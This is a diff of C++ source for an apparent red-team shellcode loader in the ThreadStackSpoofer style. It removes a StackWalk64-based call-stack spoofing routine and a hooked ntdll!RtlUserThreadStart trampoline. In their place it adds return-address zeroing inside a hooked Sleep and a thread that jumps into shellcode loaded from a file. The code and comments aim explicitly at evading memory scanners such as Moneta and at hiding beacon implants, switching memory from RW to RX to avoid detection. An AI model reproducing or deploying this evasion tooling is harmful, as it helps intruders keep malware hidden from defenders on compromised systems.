@@ -3,7 +3,6 @@
 #include <intrin.h>
 
 HookedSleep g_hookedSleep;
-StackTraceSpoofingMetadata g_stackTraceSpoofing;
 
 
 void WINAPI MySleep(DWORD _dwMilliseconds)
@@ -11,7 +10,11 @@ void WINAPI MySleep(DWORD _dwMilliseconds)
     const register DWORD dwMilliseconds = _dwMilliseconds;
 
     // Perform this (current) thread call stack spoofing.
-    spoofCallStack(true);
+    PULONG_PTR overwrite = (PULONG_PTR)_AddressOfReturnAddress();
+    const register ULONG_PTR origReturnAddress = *overwrite;
+
+    log("[>] Original return address: 0x", std::hex, std::setw(8), std::setfill('0'), origReturnAddress, ". Finishing call stack...");
+    *overwrite = 0;
 
     log("\n===> MySleep(", std::dec, dwMilliseconds, ")\n");
 
@@ -19,7 +22,8 @@ void WINAPI MySleep(DWORD _dwMilliseconds)
     ::SleepEx(dwMilliseconds, false);
 
     // Restore original thread's call stack.
-    spoofCallStack(false);
+    log("[<] Restoring original return address...");
+    *overwrite = origReturnAddress;
 }
 
 bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers /*= NULL*/)
@@ -113,252 +117,6 @@ bool hookSleep()
     return true;
 }
 
-void walkCallStack(HANDLE hThread, CallStackFrame* frames, size_t maxFrames, size_t* numOfFrames, bool onlyBeaconFrames, size_t framesToPreserve)
-{
-    CONTEXT c = { 0 };
-    STACKFRAME64 s = { 0 };
-    DWORD imageType;
-    ULONG curRecursionCount = 0;
-
-    c.ContextFlags = CONTEXT_ALL;
-
-    //
-    // It looks like RtlCaptureContext was able to acquire running thread's context,
-    // while GetThreadContext failed at doing so.
-    //
-    if (hThread == GetCurrentThread() || hThread == 0)
-        RtlCaptureContext(&c);
-    else
-        GetThreadContext(hThread, &c);
-
-#ifdef _M_IX86
-    const ULONG_PTR invalidAddr = 0xcccccccc;
-    // normally, call ImageNtHeader() and use machine info from PE header
-    imageType = IMAGE_FILE_MACHINE_I386;
-    s.AddrPC.Offset = c.Eip;
-    s.AddrPC.Mode = AddrModeFlat;
-    s.AddrFrame.Offset = c.Ebp;
-    s.AddrFrame.Mode = AddrModeFlat;
-    s.AddrStack.Offset = c.Esp;
-    s.AddrStack.Mode = AddrModeFlat;
-#elif _M_X64
-    const ULONG_PTR invalidAddr = 0xcccccccccccccccc;
-    imageType = IMAGE_FILE_MACHINE_AMD64;
-    s.AddrPC.Offset = c.Rip;
-    s.AddrPC.Mode = AddrModeFlat;
-    s.AddrFrame.Offset = c.Rsp;
-    s.AddrFrame.Mode = AddrModeFlat;
-    s.AddrStack.Offset = c.Rsp;
-    s.AddrStack.Mode = AddrModeFlat;
-#elif _M_IA64
-    const ULONG_PTR invalidAddr = 0xcccccccccccccccc;
-    imageType = IMAGE_FILE_MACHINE_IA64;
-    s.AddrPC.Offset = c.StIIP;
-    s.AddrPC.Mode = AddrModeFlat;
-    s.AddrFrame.Offset = c.IntSp;
-    s.AddrFrame.Mode = AddrModeFlat;
-    s.AddrBStore.Offset = c.RsBSP;
-    s.AddrBStore.Mode = AddrModeFlat;
-    s.AddrStack.Offset = c.IntSp;
-    s.AddrStack.Mode = AddrModeFlat;
-#else
-#error "Platform not supported!"
-#endif
-
-    log("\nWalkCallStack: Stack Trace: ");
-
-    *numOfFrames = 0;
-    ULONG Frame = 0;
-
-    for (Frame = 0; ; Frame++)
-    {
-        //
-        // A call to dbghelp!StackWalk64 that will let us iterate over thread's call stack.
-        //
-        BOOL result = g_stackTraceSpoofing.pStackWalk64(
-            imageType,
-            GetCurrentProcess(),
-            hThread,
-            &s,
-            &c,
-            NULL,
-            (PFUNCTION_TABLE_ACCESS_ROUTINE64)g_stackTraceSpoofing.pSymFunctionTableAccess64,
-            (PGET_MODULE_BASE_ROUTINE64)g_stackTraceSpoofing.pSymGetModuleBase64,
-            NULL
-        );
-
-        if (!result || s.AddrReturn.Offset == 0)
-            break;
-
-        if (s.AddrPC.Offset == s.AddrReturn.Offset)
-        {
-            if (curRecursionCount > 1000)
-            {
-                // Overly deep recursion spotted, bailing out.
-                break;
-            }
-            curRecursionCount++;
-        }
-        else
-        {
-            curRecursionCount = 0;
-        }
-
-        CallStackFrame frame = { 0 };
-
-        frame.calledFrom = s.AddrPC.Offset;
-        frame.stackAddr = s.AddrStack.Offset;
-        frame.frameAddr = s.AddrFrame.Offset;
-        frame.retAddr = s.AddrReturn.Offset;
-
-        if (Frame > maxFrames)
-            break;
-
-        //
-        // Skip first two frames as they most likely link back to our callers - and thus we can't spoof them:
-        // MySleep(...) -> spoofCallStack(...) -> ...
-        //
-        if (Frame < framesToPreserve)
-            continue;
-
-        bool skipFrame = false;
-
-        if (onlyBeaconFrames)
-        {
-            MEMORY_BASIC_INFORMATION mbi = { 0 };
-
-            if (VirtualQuery((LPVOID)frame.retAddr, &mbi, sizeof(mbi)))
-            {
-                //
-                // If a frame points back to memory pages that are not MEM_PRIVATE (originating from VirtualAlloc)
-                // we can skip them, as they shouldn't point back to our beacon's memory pages.
-                // Also I've noticed, that for some reason parameter for kernel32!Sleep clobbers stack, making it look like
-                // it's a frame by its own. That address (5 seconds = 5000ms = 0x1388) when queried with VirtualQuery seems to return
-                // mbi.Type == 0. We're using this observation to include such frame in spoofing.
-                //
-                if (mbi.Type != MEM_PRIVATE && mbi.Type != 0) skipFrame = true;
-
-            }
-
-            if (frame.retAddr == invalidAddr) skipFrame = true;
-        }
-
-        if (!skipFrame && frame.retAddr != 0 && frame.frameAddr != 0)
-        {
-            frames[(*numOfFrames)++] = frame;
-        }
-
-        log("\t", std::dec, Frame, ".\tcalledFrom: 0x", std::setw(8), std::hex, frame.calledFrom, " - stack: 0x", frame.stackAddr, 
-            " - frame: 0x", frame.frameAddr, " - ret: 0x", frame.retAddr, " - skip? ", skipFrame);
-    }
-}
-
-void spoofCallStack(bool overwriteOrRestore)
-{
-    CallStackFrame frames[MaxStackFramesToSpoof] = { 0 };
-    size_t numOfFrames = 0;
-
-    //
-    // Firstly we walk through the current thread's call stack collecting all frames
-    // that resemble references to Beacon's allocation pages (or are in any other means anomalous by looking).
-    //
-    walkCallStack(GetCurrentThread(), frames, _countof(frames), &numOfFrames, true);
-
-    if (overwriteOrRestore)
-    {
-        for (size_t i = 0; i < numOfFrames; i++)
-        {
-            auto& frame = frames[i];
-
-            if (g_stackTraceSpoofing.spoofedFrames < MaxStackFramesToSpoof)
-            {
-                //
-                // We will use CreateFileW as a fake return address to place onto the thread's frame on stack.
-                //
-                frame.overwriteWhat = (ULONG_PTR)::CreateFileW;
-
-                //
-                // We're saving original frame to later use it for call stack restoration.
-                //
-                g_stackTraceSpoofing.spoofedFrame[g_stackTraceSpoofing.spoofedFrames++] = frame;
-            }
-        }
-
-        for (size_t i = 0; i < g_stackTraceSpoofing.spoofedFrames; i++)
-        {
-            auto frame = g_stackTraceSpoofing.spoofedFrame[i];
-
-            //
-            // We overwrite thread's frame by writing a function pointer onto the thread's stack precisely where
-            // the function's return address stored.
-            //
-            *(PULONG_PTR)(frame.frameAddr + sizeof(ULONG_PTR)) = frame.overwriteWhat;
-
-            log("\t\t\tSpoofed: 0x", 
-                std::setw(8), std::setfill('0'), std::hex, frame.retAddr, " -> 0x", frame.overwriteWhat);
-        }
-    }
-    else
-    {
-        for (size_t i = 0; i < g_stackTraceSpoofing.spoofedFrames; i++)
-        {
-            auto frame = g_stackTraceSpoofing.spoofedFrame[i];
-
-            //
-            // Here we restore original return addresses so that our shellcode can continue its execution.
-            //
-            *(PULONG_PTR)(frame.frameAddr + sizeof(ULONG_PTR)) = frame.retAddr;
-
-            log("\t\t\tRestored: 0x", std::setw(8), std::setfill('0'), std::hex, frame.overwriteWhat, " -> 0x", frame.retAddr);
-        }
-
-        memset(g_stackTraceSpoofing.spoofedFrame, 0, sizeof(g_stackTraceSpoofing.spoofedFrame));
-        g_stackTraceSpoofing.spoofedFrames = 0;
-    }
-
-    return;
-}
-
-bool initStackSpoofing()
-{
-    memset(&g_stackTraceSpoofing, 0, sizeof(g_stackTraceSpoofing));
-
-    //
-    // Firstly we need to load dbghelp.dll to resolve necessary functions' pointers.
-    //
-    g_stackTraceSpoofing.hDbghelp = LoadLibraryA("dbghelp.dll");
-    if (!g_stackTraceSpoofing.hDbghelp)
-        return false;
-
-    //
-    // Now we resolve addresses of a few required functions.
-    //
-    g_stackTraceSpoofing.pSymFunctionTableAccess64 =
-        GetProcAddress(g_stackTraceSpoofing.hDbghelp, "SymFunctionTableAccess64");
-    g_stackTraceSpoofing.pSymGetModuleBase64 =
-        GetProcAddress(g_stackTraceSpoofing.hDbghelp, "SymGetModuleBase64");
-    g_stackTraceSpoofing.pStackWalk64 =
-        (typeStackWalk64)GetProcAddress(g_stackTraceSpoofing.hDbghelp, "StackWalk64");
-    auto pSymInitialize =
-        (typeSymInitialize)GetProcAddress(g_stackTraceSpoofing.hDbghelp, "SymInitialize");
-
-    if (!g_stackTraceSpoofing.pSymFunctionTableAccess64
-        || !g_stackTraceSpoofing.pSymGetModuleBase64
-        || !g_stackTraceSpoofing.pStackWalk64
-        || !pSymInitialize
-        )
-        return false;
-
-    // 
-    // Now in order to get StackWalk64 working correctly, we need to call SymInitialize.
-    //
-    pSymInitialize(GetCurrentProcess(), nullptr, TRUE);
-
-    log("[+] Stack spoofing initialized.");
-    g_stackTraceSpoofing.initialized = true;
-    return true;
-}
-
 bool readShellcode(const char* path, std::vector<uint8_t>& shellcode)
 {
     HandlePtr file(CreateFileA(
@@ -383,7 +141,19 @@ bool readShellcode(const char* path, std::vector<uint8_t>& shellcode)
     return ReadFile(file.get(), shellcode.data(), lowSize, &readBytes, NULL);
 }
 
-bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr &thread)
+void runShellcode(LPVOID param)
+{
+    auto func = ((void(*)())param);
+
+    //
+    // Jumping to shellcode. Look at the coment in injectShellcode() describing why we opted to jump
+    // into shellcode in a classical manner instead of fancy hooking 
+    // ntdll!RtlUserThreadStart+0x21 like in ThreadStackSpoofer example.
+    //
+    func();
+}
+
+bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread)
 {
     //
     // Firstly we allocate RW page to avoid RWX-based IOC detections
@@ -395,53 +165,57 @@ bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr &thread)
         PAGE_READWRITE
     );
 
-    if (!alloc) 
+    if (!alloc)
         return false;
 
     memcpy(alloc, shellcode.data(), shellcode.size());
 
     DWORD old;
-    
+
     //
     // Then we change that protection to RX
     // 
     if (!VirtualProtect(alloc, shellcode.size() + 1, Shellcode_Memory_Protection, &old))
         return false;
 
+    /*
+    * We're not setting these pointers to let the hooked sleep handler figure them out itself.
+    *
+    g_fluctuationData.shellcodeAddr = alloc;
+    g_fluctuationData.shellcodeSize = shellcode.size();
+    g_fluctuationData.protect = Shellcode_Memory_Protection;
+    */
 
-    //
-    // In order for our thread to blend in more effectively, we start it from the ntdll!RtlUserThreadStart+0x21
-    // function that is hooked by placing a trampoline call into our shellcode. After a second, the function will be
-    // unhooked to remove easy leftovers (IOCs) and maintain process' stability.
-    //
-    LPVOID fakeAddr = (LPVOID)(((ULONG_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "RtlUserThreadStart")) + 0x21);
-
-    BYTE origRtlUserThreadStartBytes[16];
-    HookTrampolineBuffers buffers = { 0 };
-    buffers.previousBytes = buffers.originalBytes = origRtlUserThreadStartBytes;
-    buffers.previousBytesSize = buffers.originalBytesSize = sizeof(origRtlUserThreadStartBytes);
-    if (!fastTrampoline(true, (BYTE*)fakeAddr, alloc, &buffers))
-        return false;
-    
     shellcode.clear();
 
     //
-    // The shellcode starts from the hooked ntdll!RtlUserThreadStart+0x21
+    // Example provided in previous release of ThreadStackSpoofer:
+    //      https://github.com/mgeeky/ThreadStackSpoofer/blob/ec0237c5f8b1acd052d57562a43f40a20752b5ca/ThreadStackSpoofer/main.cpp#L417
+    // showed how we can start our shellcode from temporarily hooked ntdll!RtlUserThreadStart+0x21 .
+    // 
+    // That approached was a bit flawed due to the fact, the as soon as we introduce a hook within module,
+    // even when we immediately unhook it the system allocates a page of memory (4096 bytes) of type MEM_PRIVATE
+    // inside of a shared library allocation that comprises of MEM_IMAGE/MEM_MAPPED pool. 
+    // 
+    // Memory scanners such as Moneta are sensitive to scanning memory mapped PE DLLs and finding amount of memory
+    // labeled as MEM_PRIVATE within their region, considering this (correctly!) as a "Modified Code" anomaly.
+    // 
+    // We're unable to evade this detection for kernel32!Sleep however we can when it comes to ntdll. Instead of
+    // running our shellcode from a legitimate user thread callback, we can simply run a thread pointing to our
+    // method and we'll instead jump to the shellcode from that method.
+    // 
+    // After discussion I had with @waldoirc we came to the conclusion that in order not to bring other IOCs it is better
+    // to start shellcode from within EXE's own code space, thus avoiding detections based on `ntdll!RtlUserThreadStart+0x21` 
+    // being an outstanding anomaly in some environments. Shout out to @waldoirc for our really long discussion!
     //
     thread.reset(::CreateThread(
         NULL,
         0,
-        (LPTHREAD_START_ROUTINE)fakeAddr,
-        0,
+        (LPTHREAD_START_ROUTINE)runShellcode,
+        alloc,
         0,
         0
     ));
-
-    ::SleepEx(1000, false);
-
-    // Here we restore original stub bytes of that API.
-    if (!fastTrampoline(false, (BYTE*)fakeAddr, alloc, &buffers))
-        return false;
 
     return (NULL != thread.get());
 }
@@ -466,13 +240,6 @@ int main(int argc, char** argv)
 
     if (spoof)
     {
-        log("[.] Thread call stack will be spoofed.");
-        if (!initStackSpoofing())
-        {
-            log("[!] Could not initialize stack spoofing!");
-            return 1;
-        }
-
         log("[.] Hooking kernel32!Sleep...");
         if (!hookSleep())
         {
